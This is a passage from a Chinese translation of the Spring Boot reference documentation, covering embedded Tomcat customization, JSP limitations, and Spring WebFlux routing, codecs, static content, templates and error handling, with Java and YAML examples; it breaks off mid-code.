<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">Duration</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>embedded<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span></span><span class="token class-name">TomcatServletWebServerFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">WebServerFactoryCustomizer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyTomcatWebServerFactoryCustomizer</span> <span class="token keyword">implements</span> <span class="token class-name">WebServerFactoryCustomizer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">TomcatServletWebServerFactory</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">customize</span><span class="token punctuation">(</span><span class="token class-name">TomcatServletWebServerFactory</span> server<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        server<span class="token punctuation">.</span><span class="token function">addConnectorCustomizers</span><span class="token punctuation">(</span><span class="token punctuation">(</span>connector<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> connector<span class="token punctuation">.</span><span class="token function">setAsyncTimeout</span><span class="token punctuation">(</span><span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">ofSeconds</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h6><a id="_ConfigurableServletWebServerFactory_635"></a>直接自定义 ConfigurableServletWebServerFactory</h6> 
<p>对于需要从 <code>ServletWebServerFactory</code> 扩展的高级用例，您可以自己公开一个此类 Bean。<br> 我们为许多配置选项提供了设置器。如果您需要做一些更特殊的事情，我们还提供了几个受保护的方法 “钩子”。详情请查看<a href="https://docs.spring.io/spring-boot/docs/3.2.0/api/org/springframework/boot/web/servlet/server/ConfigurableServletWebServerFactory.html" rel="nofollow">源代码文档</a>。</p> 
<blockquote> 
 <p>自动配置的自定义程序仍会应用于自定义工厂，因此请谨慎使用该选项。</p> 
</blockquote> 
<h5><a id="JSP__640"></a>JSP 的局限</h5> 
<p>在运行使用嵌入式 servlet 容器（并打包为可执行存档）的 Spring Boot 应用程序时，JSP 支持会受到一些限制。</p> 
<ul><li>如果使用 war 打包，Jetty 和 Tomcat 应该可以正常工作。使用 <code>java -jar</code> 启动时，可执行 war 将正常工作，而且还可以部署到任何标准容器中。使用可执行 jar 时不支持 JSP。</li><li>Undertow 不支持 JSP。</li><li>创建自定义 <code>error.jsp</code> 页面不会覆盖错误处理的默认视图。应使用自定义错误页面。</li></ul> 
<h3><a id="Reactive_Web_Applications_646"></a>Reactive Web Applications</h3> 
<p>Spring Boot 通过为 Spring Webflux 提供自动配置，简化了反应式网络应用程序的开发。</p> 
<h4><a id="Spring_WebFlux_Framework_648"></a>Spring WebFlux Framework</h4> 
<p>Spring WebFlux 是 Spring Framework 5.0 中引入的全新反应式 Web 框架。与 Spring MVC 不同，它不需要 servlet API，是完全异步和非阻塞的，并通过 <a href="https://projectreactor.io/" rel="nofollow">Reactor 项目</a>实现了 <a href="https://www.reactive-streams.org/" rel="nofollow">Reactive Streams</a> 规范。<br> Spring WebFlux 有两种类型：功能型和基于注解型。如以下示例所示，基于注解的 WebFlux 非常接近 Spring MVC 模型：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">reactor<span class="token punctuation">.</span>core<span class="token punctuation">.</span>publisher<span class="token punctuation">.</span></span><span class="token class-name">Flux</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">reactor<span class="token punctuation">.</span>core<span class="token punctuation">.</span>publisher<span class="token punctuation">.</span></span><span class="token class-name">Mono</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DeleteMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/users"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRestController</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">UserRepository</span> userRepository<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">CustomerRepository</span> customerRepository<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MyRestController</span><span class="token punctuation">(</span><span class="token class-name">UserRepository</span> userRepository<span class="token punctuation">,</span> <span class="token class-name">CustomerRepository</span> customerRepository<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository <span class="token operator">=</span> userRepository<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>customerRepository <span class="token operator">=</span> customerRepository<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/{userId}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/{userId}/customers"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Flux</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Customer</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUserCustomers</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flatMapMany</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>customerRepository<span class="token operator">::</span><span class="token function">findByUser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@DeleteMapping</span><span class="token punctuation">(</span><span class="token string">"/{userId}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">deleteUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository<span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>WebFlux 是 Spring 框架的一部分，详细信息请参阅其<a href="https://docs.spring.io/spring-framework/reference/6.1/web/webflux.html" rel="nofollow">参考文档</a>。<br> "WebFlux.fn "是功能变体，它将路由配置与请求的实际处理分离开来，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">MediaType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RequestPredicate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RouterFunction</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RequestPredicates</span><span class="token punctuation">.</span><span class="token static">accept</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">RouterFunctions</span><span class="token punctuation">.</span><span class="token static">route</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRoutingConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">RequestPredicate</span> <span class="token constant">ACCEPT_JSON</span> <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_JSON</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">RouterFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">monoRouterFunction</span><span class="token punctuation">(</span><span class="token class-name">MyUserHandler</span> userHandler<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/{user}"</span><span class="token punctuation">,</span> <span class="token constant">ACCEPT_JSON</span><span class="token punctuation">,</span> userHandler<span class="token operator">::</span><span class="token function">getUser</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/{user}/customers"</span><span class="token punctuation">,</span> <span class="token constant">ACCEPT_JSON</span><span class="token punctuation">,</span> userHandler<span class="token operator">::</span><span class="token function">getUserCustomers</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">DELETE</span><span class="token punctuation">(</span><span class="token string">"/{user}"</span><span class="token punctuation">,</span> <span class="token constant">ACCEPT_JSON</span><span class="token punctuation">,</span> userHandler<span class="token operator">::</span><span class="token function">deleteUser</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">reactor<span class="token punctuation">.</span>core<span class="token punctuation">.</span>publisher<span class="token punctuation">.</span></span><span class="token class-name">Mono</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>function<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyUserHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUserCustomers</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">deleteUser</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>"WebFlux.fn "是 Spring 框架的一部分，详细信息请参阅其<a href="https://docs.spring.io/spring-framework/reference/6.1/web/webflux-functional.html" rel="nofollow">参考文档</a>。</p> 
<blockquote> 
 <p>您可以定义任意数量的 <code>RouterFunction</code> Bean，以便将路由器的定义模块化。如果需要应用优先级，可以对Bean进行排序。</p> 
</blockquote> 
<p>要开始使用，请在应用程序中添加 <code>spring-boot-starter-webflux</code> 模块。</p> 
<blockquote> 
 <p>在应用程序中同时添加 <code>spring-boot-starter-web</code> 和 <code>spring-boot-starter-webflux</code> 模块会导致 Spring Boot 自动配置 Spring MVC，而不是 WebFlux。之所以选择这种行为，是因为许多 Spring 开发人员将 <code>spring-boot-starter-webflux</code> 添加到他们的 Spring MVC 应用程序中，以使用反应式 WebClient。您仍然可以通过将所选应用程序类型设置为 <code>SpringApplication.setWebApplicationType(WebApplicationType.REACTIVE)</code>来执行您的选择。</p> 
</blockquote> 
<h5><a id="Spring_WebFlux__750"></a>Spring WebFlux 自动配置</h5> 
<p>Spring Boot 为 Spring WebFlux 提供了自动配置，可与大多数应用程序完美配合。<br> 自动配置在 Spring 的默认设置基础上增加了以下功能：</p> 
<ul><li>为 <code>HttpMessageReader</code> 和 <code>HttpMessageWriter</code> 实例配置编解码器（本文档稍后将介绍）。</li><li>支持静态资源服务，包括对 WebJar 的支持（本文档稍后将介绍）。</li></ul> 
<p>如果想保留 Spring Boot WebFlux 功能并添加额外的 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webflux/config.html" rel="nofollow">WebFlux 配置</a>，可以添加自己的 <code>@Configuration</code> 类，该类属于 <code>WebFluxConfigurer</code> 类型，但不含 <code>@EnableWebFlux</code>。<br> 如果想完全控制 Spring WebFlux，可以添加自己的 <code>@Configuration</code> 类，并注释为 <code>@EnableWebFlux</code>。</p> 
<h5><a id="Spring_WebFlux__759"></a>Spring WebFlux 转换服务</h5> 
<p>如果要自定义 Spring WebFlux 使用的 <code>ConversionService</code>，可以提供一个带有 <code>addFormatters</code> 方法的 <code>WebFluxConfigurer</code> Bean。<br> 还可以使用 <code>spring.webflux.format.*</code> 配置属性自定义转换。未配置时，将使用以下默认值：</p> 
<table><thead><tr><th><strong>属性</strong></th><th><code>DateTimeFormatter</code></th></tr></thead><tbody><tr><td><code>spring.webflux.format.date</code></td><td><code>ofLocalizedDate(FormatStyle.SHORT)</code></td></tr><tr><td><code>spring.webflux.format.time</code></td><td><code>ofLocalizedTime(FormatStyle.SHORT)</code></td></tr><tr><td><code>spring.webflux.format.date-time</code></td><td><code>ofLocalizedDateTime(FormatStyle.SHORT)</code></td></tr></tbody></table> 
<h5><a id="_HttpMessageReaders__HttpMessageWriters__HTTP__769"></a>带有 HttpMessageReaders 和 HttpMessageWriters 的 HTTP 编解码器</h5> 
<p>Spring WebFlux 使用 <code>HttpMessageReader</code> 和 <code>HttpMessageWriter</code> 接口来转换 HTTP 请求和响应。它们通过 <code>CodecConfigurer</code> 进行配置，以通过查看类路径中可用的库获得合理的默认值。<br> Spring Boot 为编解码器提供了专用的配置属性 <code>spring.codec.*</code>。它还可通过使用 <code>CodecCustomizer</code> 实例进一步自定义。例如，<code>spring.jackson.*</code> 配置键适用于 Jackson 编解码器。<br> 如果需要添加或自定义编解码器，可以创建一个自定义 <code>CodecCustomizer</code> 组件，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">CodecCustomizer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">ServerSentEventHttpMessageReader</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyCodecsConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">CodecCustomizer</span> <span class="token function">myCodecCustomizer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>configurer<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{<!-- --></span>
            configurer<span class="token punctuation">.</span><span class="token function">registerDefaults</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            configurer<span class="token punctuation">.</span><span class="token function">customCodecs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServerSentEventHttpMessageReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// ...</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>您还可以利用 <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.json.jackson.custom-serializers-and-deserializers" rel="nofollow">Boot 的自定义 JSON 序列化器和反序列化器</a>。</p> 
<h5><a id="_794"></a>静态内容</h5> 
<p>默认情况下，Spring Boot 会从类路径中名为 <code>/static</code>（或 <code>/public</code>、<code>/resources</code> 或<code> /META-INF/resources</code>）的目录中提供静态内容。它使用 Spring WebFlux 中的 <code>ResourceWebHandler</code>，因此您可以通过添加自己的 <code>WebFluxConfigurer</code> 并覆盖 <code>addResourceHandlers</code> 方法来修改该行为。<br> 默认情况下，资源映射在 /**上，但你可以通过设置 <code>spring.webflux.static-path-pattern</code> 属性来调整。例如，将所有资源重新定位到 <code>/resources/**</code> 可按如下方法实现：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">webflux</span><span class="token punctuation">:</span>
    <span class="token key atrule">static-path-pattern</span><span class="token punctuation">:</span> <span class="token string">"/resources/**"</span>
</code></pre> 
<p>您还可以使用 <code>spring.web.resources.static-locations</code> 自定义静态资源位置。这样做可以用目录位置列表替换默认值。这样，默认的欢迎页面检测就会切换到自定义位置。因此，如果启动时在任何位置有 <code>index.html</code>，它就是应用程序的主页。<br> 除了前面列出的 “标准” 静态资源位置外，Webjars 内容还有一个特殊情况。默认情况下，任何路径为 <code>/webjars/**</code> 的资源，如果是以 Webjars 格式打包的，都是从 jar 文件中提供的。可以使用 <code>spring.webflux.webjars-path-pattern</code> 属性自定义路径。</p> 
<blockquote> 
 <p>Spring WebFlux 应用程序并不严格依赖于 servlet API，因此不能作为 war 文件部署，也不使用 <code>src/main/webapp</code> 目录。</p> 
</blockquote> 
<h5><a id="_806"></a>欢迎页面</h5> 
<p>Spring Boot 支持静态和模板化欢迎页面。它首先在配置的静态内容位置查找 <code>index.html</code> 文件。如果找不到，它就会查找索引模板。如果找到其中之一，它将自动用作应用程序的欢迎页面。<br> 这仅作为应用程序定义的实际索引路由的备用。排序由 <code>HandlerMapping</code> Bean 的顺序定义，默认情况下如下：</p> 
<table><thead><tr><th><code>RouterFunctionMapping</code></th><th>使用 <code>RouterFunction</code> Bean 声明的端点</th></tr></thead><tbody><tr><td><code>RequestMappingHandlerMapping</code></td><td>在 <code>@Controller</code> Bean 中声明的端点</td></tr><tr><td>欢迎页面的<code>RouterFunctionMapping</code></td><td>欢迎页面支持</td></tr></tbody></table> 
<h5><a id="_815"></a>模板引擎</h5> 
<p>除了 REST 网络服务，您还可以使用 Spring WebFlux 来提供动态 HTML 内容。Spring WebFlux 支持多种模板技术，包括 Thymeleaf、FreeMarker 和 Mustache。<br> Spring Boot 包含对以下模板引擎的自动配置支持：</p> 
<ul><li><a href="https://freemarker.apache.org/docs/" rel="nofollow">FreeMarker</a></li><li><a href="https://www.thymeleaf.org/" rel="nofollow">Thymeleaf</a></li><li><a href="https://mustache.github.io/" rel="nofollow">Mustache</a></li></ul> 
<p>在默认配置下使用这些模板引擎之一时，模板会自动从 <code>src/main/resources/templates</code> 抓取。</p> 
<h5><a id="_824"></a>错误处理</h5> 
<p>Spring Boot 提供了一个 <code>WebExceptionHandler</code>，它能以合理的方式处理所有错误。它在处理顺序中的位置紧接在 WebFlux 提供的处理程序之前，后者被认为是最后一个。对于机器客户端，它会生成一个 JSON 响应，其中包含错误的详细信息、HTTP 状态和异常消息。对于浏览器客户端，会有一个 “whitelabel” 错误处理程序，以 HTML 格式呈现相同的数据。您还可以提供自己的 HTML 模板来显示错误（见下一节）。<br> 在直接定制 Spring Boot 中的错误处理之前，您可以利用 Spring WebFlux 中的 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webflux/ann-rest-exceptions.html" rel="nofollow">RFC 7807 问题详细信息</a>支持。Spring WebFlux 可以使用 <code>application/problem+json</code> 媒体类型生成自定义错误消息，例如：</p> 
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"https://example.org/problems/unknown-project"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"title"</span><span class="token operator">:</span> <span class="token string">"Unknown project"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"status"</span><span class="token operator">:</span> <span class="token number">404</span><span class="token punctuation">,</span>
  <span class="token string-property property">"detail"</span><span class="token operator">:</span> <span class="token string">"No project found for id 'spring-unknown'"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"instance"</span><span class="token operator">:</span> <span class="token string">"/projects/spring-unknown"</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>可通过将 <code>spring.webflux.problemdetails.enabled</code> 设置为 <code>true</code> 来启用此支持。<br> 自定义此功能的第一步通常是使用现有机制，但替换或增强错误内容。为此，您可以添加一个 <code>ErrorAttributes</code> 类型的 Bean。<br> 要更改错误处理行为，可以实现 <code>ErrorWebExceptionHandler</code> 并注册该类型的 Bean 定义。由于 <code>ErrorWebExceptionHandler</code> 相当低级，因此 Spring Boot 还提供了一个方便的 <code>AbstractErrorWebExceptionHandler</code>，让您以 WebFlux 功能方式处理错误，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">reactor<span class="token punctuation">.</span>core<span class="token punctuation">.</span>publisher<span class="token punctuation">.</span></span><span class="token class-name">Mono</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">WebProperties</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>error<span class="token punctuation">.</span></span><span class="token class-name">AbstractErrorWebExceptionHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>reactive<span class="token punctuation">.</span>error<span class="token punctuation">.</span></span><span class="token class-name">ErrorAttributes</span></span><span class="token punctuation">;</span>
